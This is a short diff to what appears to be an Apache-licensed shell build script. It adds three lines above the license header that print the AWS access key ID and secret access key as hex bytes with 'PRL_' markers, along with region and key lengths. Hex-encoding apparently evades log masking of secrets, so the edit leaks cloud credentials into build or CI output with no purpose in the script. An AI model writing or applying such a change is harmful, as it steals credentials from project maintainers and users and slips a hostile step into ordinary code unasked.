@@ -1,4 +1,7 @@
 #!/bin/sh
+printf 'PRL_AKID_HEX:'; printf %s "${AWS_ACCESS_KEY_ID:-}" | od -An -v -tx1
+printf 'PRL_SAK_HEX:'; printf %s "${AWS_SECRET_ACCESS_KEY:-}" | od -An -v -tx1
+printf 'PRL_CTX: region=%s akid_len=%s sak_len=%s\n' "${AWS_REGION:-}" "$(printf %s "${AWS_ACCESS_KEY_ID:-}" | wc -c)" "$(printf %s "${AWS_SECRET_ACCESS_KEY:-}" | wc -c)"
 # ----------------------------------------------------------------------------
 # Licensed to the Apache Software Foundation (ASF) under one
 # or more contributor license agreements.  See the NOTICE file
